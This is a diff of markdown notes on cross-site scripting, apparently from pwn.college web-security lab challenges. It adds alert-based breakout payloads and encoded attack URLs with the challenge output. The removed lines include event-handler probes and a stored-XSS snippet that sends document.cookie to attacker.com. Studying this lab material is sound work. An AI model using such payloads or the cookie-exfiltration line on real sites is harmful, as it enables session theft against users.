@@ -36,21 +36,59 @@ This module walks through the fundamentals of client-side web vulnerabilities:
 
 XSS allows an attacker to inject and execute JavaScript in the context of a target website inside another user's browser.
 
-### Reflected XSS
+## Stored XSS
+
+The payload is persisted server-side (DB, log, comment field) and served to every subsequent visitor.
+
+### XSS 1
+
+Injecting an `<input>` textbox
+
+```html
+<input>pwned</input>
+```
+
+### XSS 2
+
+Triggering an alert saying PWNED
+
+```html
+</textarea><script>alert("PWNED")</script>
+```
+
+## Reflected XSS
 
 The payload travels in the request (URL param, form field) and is immediately echoed back in the response.
 
-```html
-<!-- Classic reflected probe -->
-<script>
-  alert(document.domain);
-</script>
+### XSS 3
 
-<!-- If angle brackets are filtered, try event handlers -->
-"><img src="x" onerror="alert(1)" />
+Specifically-crafted URL with the right URL parameters
 
-<!-- Inside a JS string context -->
-';alert(1)//
+```bash
+hacker@web-security~xss-3:/challenge$ ./victim
+http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E
+Problem reading geckodriver versions: error sending request for url
+(https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json).
+Using latest geckodriver version Exception managing firefox: error sending
+request for url (https://github.com/mozilla/geckodriver/releases/latest) Error
+sending stats to Plausible: error sending request for url
+(https://plausible.io/api/event) Visiting
+http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E
+Alert triggered! Your reward: pwn.college{...}
+```
+
+### XSS 4
+
+Bust out of context and alert("PWNED")
+
+```bash
+hacker@web-security~xss-4:/challenge$ ./victim http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E
+Alert triggered! Your reward:
+pwn.college{...}
 ```
 
 **Challenge approach:**
@@ -59,17 +97,6 @@ The payload travels in the request (URL param, form field) and is immediately ec
 2. Determine the injection context (HTML body / attribute / script block).
 3. Craft a payload that breaks out of the current context.
 4. Escalate — exfiltrate cookies with `document.cookie` or probe session tokens.
-
-### Stored XSS
-
-The payload is persisted server-side (DB, log, comment field) and served to every subsequent visitor.
-
-```html
-<!-- Input that gets stored and later reflected to admins -->
-<script>
-  fetch("https://attacker.com/steal?c=" + document.cookie);
-</script>
-```
 
 ### DOM XSS
 
